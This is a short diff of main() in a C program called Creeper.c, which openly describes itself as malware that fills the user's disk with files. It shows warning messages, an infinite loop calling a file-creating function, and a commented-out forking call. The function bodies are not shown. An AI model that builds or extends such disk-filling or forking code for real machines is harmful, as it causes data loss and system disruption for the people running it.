@@ -446,7 +446,7 @@ int main()
 {
   setlocale(LC_ALL, "");
   srand(time(NULL));
-  printf("Creeper.c: Catch me if you can!\n");
+  printf("CREEPER.C: Catch me if you can!\n");
   printf("WARNING:This file is considered an malware, it will run in your machine and loads you hd with stuff.\n");
   printf("PS: When you accept the terms, you'll have the risk of data losses and problems with files.\n");
   printf("For more informations, see README for details.");
@@ -474,6 +474,7 @@ int main()
   while (INFINITY_LOOP)
   {
     printf("I'M THE CREEPER. CATCH ME IF YOU CAN!\t");
+    //enableForking();
     createAndLoadFile(STUFF);
   }
   return EXIT_FAILURE;
